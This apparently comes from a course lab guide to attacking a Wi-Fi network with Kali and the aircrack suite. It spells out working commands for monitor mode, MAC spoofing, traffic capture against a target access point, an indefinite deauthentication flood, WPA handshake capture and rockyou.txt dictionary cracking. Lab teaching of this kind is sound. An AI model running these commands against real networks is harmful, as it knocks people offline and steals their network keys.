# Wireless Network Security – Hacking a Wi-Fi Network

## Pre-requisites of the lab 
1. VMware (should be provided)
2. RAM 2+GB
   - 2 GHz dual-core processor or better 
   - 4 GB system memory
3. 20 GB of free hard drive space
4. Alpha card (Wireless access point)
5. Wireless access point (Mobile phone hotspot or a real access point)

## Lab Requirements
- Change Kali Linux tab prompt.
  ```
  PS1='[`date "+%D"`] yourname@\h:\w\$ '
  ```

- Access point password should be: `Password123`

![Image](https://i.imgur.com/qMhBzmh.png)

## Get Your Wi-Fi Adapter ready
To retrieve a list of interfaces (even the inactive ones)
```bash
$ ifconfig -a
```
![Image](https://i.imgur.com/uP01FTo.png) 

Before connecting the Wireless card
![Image](https://i.imgur.com/Bhabpb3.png)

Screenshot above shows after connecting the wireless card.
Typically, wireless interfaces are represented as wlanXX
If the wireless interface is on the DOWN state (disabled), then we should enable it before doing anything meaningful with it by using the command below.
Please note: Your interface maybe different from my own e.g. mine is wlan0, yours may be wlan1, wlan2, etc.
```bash
$ ifconfig <interface> up
```
The first stage is to ensure your WiFi adapter is connected to your Kali machine.
To see the characteristics of the wireless extensions of the interfaces on our system. Run the command `iwconfig` to check if your Wi-Fi adapter is connected.
If the wireless adapter is not connected as the screenshot below shows our Wi-Fi adapter is not yet connected. See steps below for connecting.
![Image](https://i.imgur.com/tfG6UXP.png)

Go over to the VMware menu and select VM > Removable devices > (Your Wi-Fi adapter) > connect (Disconnect from Host). 
As seen in the screenshot below.
![Image](https://i.imgur.com/xa2QSkx.png)

![Image](https://i.imgur.com/AYMgoti.png) 

Then we run the `iwconfig` command again, we would observe that our Wi-Fi adapter has been connected to Kali on managed mode (Please note if you do not see your adapter connected at this stage, there is something wrong with the setup/driver of your Wi-Fi adapter)
![Image](https://i.imgur.com/iEsufSa.png)

## Changing the transmission power
The region of the device is an important setting which indirectly dictates the strength of the signal in which the card transmits. Different countries have different legislations regarding the maximum strength of the signal of a wireless card. For pen testing purposes, it is to the best benefit to have a card set to the maximum supporting power
To get the current region
```bash
$ iw reg get
```
![Image](https://i.imgur.com/S8iHQrz.png)

To change the region thus, the transmission power of the card
```bash
$ sudo ifconfig <interface> down
$ sudo iw reg set <region code>
$ sudo ifconfig <interface> up
$ sudo iw reg get
```
![Image](https://i.imgur.com/5jOSNu6.png)

A comprehensive list of region codes can be retrieved [here](https://en.wikipedia.org/wiki/ISO_3166-1_alpha-2).

In the screenshot above, we selected CA for Canada.

## Kill any other processes that can interfere
We can use the command `sudo airmon-ng check kill` to check if there are any processes running.
![Image](https://i.imgur.com/vssZ7ee.png)

## Changing the operation mode
Typically, wireless cards are set to managed mode, so they can function as clients to infrastructure-based networks. Monitor mode allows cards to read all traffic including packets that originate from non-associated networks.
To set the card in monitor mode one can rely on the tool airmon-ng of the aircrack suite.
```bash
$ sudo airmon-ng start <interface>
```
![Image](https://i.imgur.com/jPI1h9f.png)

You can check with the iwconfig command as seen below. 
![Image](https://i.imgur.com/BQDOXzf.png)

## Optional
### Changing the MAC address
It is possible to change the MAC address of the NIC card
```bash
$ sudo ifconfig <interface> down
$ sudo macchanger –m <new mac address> <interface>
$ sudo ifconfig <interface> up
```
### Analyzing Wireless Traffic
When a wireless card is set in monitor mode it captures all packets from the air interface. It is possible with the right tools to view, analyze, and store these packets.
To view a list of all the APs in the area and the STAs connected to each one
```bash
$ sudo airodump-ng <interface in monitor mode>
$ sudo airodump-ng wlan0
```
![Image](https://i.imgur.com/evTfJhA.png)

![Image](https://i.imgur.com/23lrHjU.png)

### Availability Attacks
It is possible to reduce the availability of a wireless network or cause denial-of-service (DoS) against specific clients by forging and transmitting specific management (in most cases) frames. This stems from the fact that in 802.11 networks management frames are transmitted unencrypted.

### List connected clients to target.
We would like to show only our target/victim access point and list the list of targets connected to it. This would help us prepare for the deauthentication.
Run the command below to display only the target access point and the clients.
```bash
$ sudo airodump-ng wlan0 -d <target Mac address>
$ sudo airodump-ng wlan0 -d 42:6F:69:A3:8C:4A 
```
![Image](https://i.imgur.com/qPRPJhW.png)

![Image](https://i.imgur.com/A6nN1NA.png)

See screenshot of a client connected to our victim Access point. In this example, we connected a mobile phone to our rouge access point.
![Image](https://i.imgur.com/lviajjZ.png)

### Save captured traffic for cracking
We would run a command to capture all our traffic captured from our wireless attack to make it easy for cracking. In this example, I used hackwifi, but please add your name in front of yours e.g jashanhackwifi
Command
```bash
$ sudo airodump-ng -w <Yournamehackwifi> -c 1 --bssid <Your victim MAC ID>  wlan0
$ sudo airodump-ng -w hackwifi -c 1 --bssid 42:6F:69:A3:8C:4A  wlan0
```
![Image](https://i.imgur.com/7K7yQes.png)

![Image](https://i.imgur.com/4C9ENAi.png)

### Open a new tab and go over to the de-authentication phase.

## De-authentication attack
The most effective way

 of creating a DoS attack against all or specific clients of the network. The aircrack suite has tools that automate this process. To unleash a deauthentication attack against all clients connected to a specific AP, first, one must know the MAC address of the victim AP. This can be easily done via airodump-ng or Wireshark. Then, by using the `-0` (or `--deauth`) option of the `aireplay-ng` tool one can cause a flood of deauthentication frames to be transmitted.
```bash
$ sudo aireplay-ng --ignore-negative-one -0 <packets to be sent> -a <AP MAC Address> <interface in monitor mode>
$ sudo aireplay-ng --deauth 0 -a 42:6F:69:A3:8C:4A wlan0
```
![Image Description](https://i.imgur.com/lk7WfJZ.png){:height="50%" width="50%"}

Notice that you can insert 0 instead of a predefined number of packets and the process will carry on indefinitely.

After the deauth, our client (Mobile phone) on the victim access point would try re-authenticate to another network.
![Image Description](https://i.imgur.com/8WThlaT.png){:height="50%" width="50%"}

Screenshot of phone connecting to another Wi-Fi network.

After a successful deauth has been sent, we would reconnect to our rouge access point. Once we reconnect, we would see from our pcap capture that the WPA handshake would be captured as seen below.
![Image Description](https://i.imgur.com/qdG5yNg.png)

Once captured, we can use `Ctrl+C` from the keyboard to cancel the capture.

After the WPA handshake has been captured. The next step is to analyze the capture using Wireshark. Let us list the files captured using the `ls` command.
![Image Description](https://i.imgur.com/RuE5okA.png)

Next step is to run the command `Wireshark <name of your file>`
![Image Description](https://i.imgur.com/Q9VFT6s.png)

Wireshark opens with your pcap capture.
![Image Description](https://i.imgur.com/JYhq4lq.png)

Type the filter `eapol` to filter the traffic using EAPoL protocol.
EAPoL
Extensible Authentication Protocol (EAP) over LAN (EAPoL Protocol) is a network port authentication protocol used in IEEE 802.1X (Port Based Network Access Control) developed to give a generic network sign-on to access network resources.
![Image Description](https://i.imgur.com/IMEmdMq.png)

We run the command `iwconfig` again. We see our Wi-Fi adapter is still on monitor mode. So, we run a command to stop monitor mode.
![Image Description](https://i.imgur.com/FtKqG9K.png)

```bash
$ sudo airmon-ng stop wlan0
```
![Image Description](https://i.imgur.com/TlVom98.png)

Check the mode again using the command `iwconfig`. We would see that our Wi-Fi adapter is back to monitor mode as seen below.
![Image Description](https://i.imgur.com/jihNYF1.png)

## Cracking Wi-Fi Passwords
In this phase of our test, we would work on cracking the captured password using a tool called aircrack-ng.
Aircrack-ng: Aircrack-ng uses various techniques to crack WEP and WPA/WPA2-PSK keys.
Let us run the locate command to find our password list `rockyou.txt`
By default, the `rockyou.txt` is always zipped on Kali. We would have to unzip.
Use the following commands.
```bash
$ locate rockyou.txt
$ cd /usr/share/wordlists/
$ ls
$ sudo gzip -d rockyou.txt.gz
```
![](https://i.imgur.com/BBQq9mw.png)

![](https://i.imgur.com/lq2MPQj.png)

After doing this, change your directory back to where your pcap file was captured.
![](https://i.imgur.com/5XVVNzk.png)

Now that we have located a password list, we would use the command below to run the cracker on the captured pcap file.
```bash
$ sudo aircrack-ng <PCAPCaptureFilename> -w /usr/share/wordlists/rockyou.txt
$ sudo aircrack-ng hackwifi-01.cap -w /usr/share/wordlists/rockyou.txt
```
As seen below.
![](https://i.imgur.com/wWQOv8C.png)

![](https://i.imgur.com/NTvlcvw.png)


---
Congratulations! You have completed the Wi-Fi Hacking Lab. By following the steps outlined in this guide, you have gained valuable insights into the intricacies of wireless network security and the tools used for penetration testing. Remember, with great knowledge comes great responsibility. Always ensure that you apply your newfound skills ethically and responsibly, respecting the privacy and security of others. Continuously expand your knowledge and stay updated with the latest developments in cybersecurity. Happy hacking, and may your endeavors contribute to a safer and more secure digital world.
---
